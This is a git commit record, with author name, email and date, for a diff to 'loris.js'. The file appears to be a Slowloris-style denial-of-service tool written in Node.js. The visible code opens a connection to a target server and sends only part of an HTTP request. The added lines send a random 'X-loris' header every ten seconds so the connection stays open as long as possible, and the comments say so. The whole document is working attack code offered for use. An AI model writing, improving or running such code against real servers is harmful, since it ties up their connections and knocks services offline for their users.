aceedbccce5063ac4c20acadc71ac8b309d419a4
iszmidt <ian10_141@yahoo.com.br>
2017-09-22 18:34:07 -0300

    Update loris.js

--- loris.js
+++ loris.js
@@ -20,6 +20,10 @@ const open = ()=>{
 	const client = net.connect(args.port, args.host, ()=> {		
 		//send just a part of the header, so the server keeps waiting for the rest of the request
 		client.write('GET / HTTP/1.1\r\n');
+		setInterval(()=>{
+		  //send some random stuff to keep connection open as long as possible
+		  client.write('X-loris:'+ Math.random()*999000);	
+		},10000)
 	});	
 	
 	client.on('error', function() {
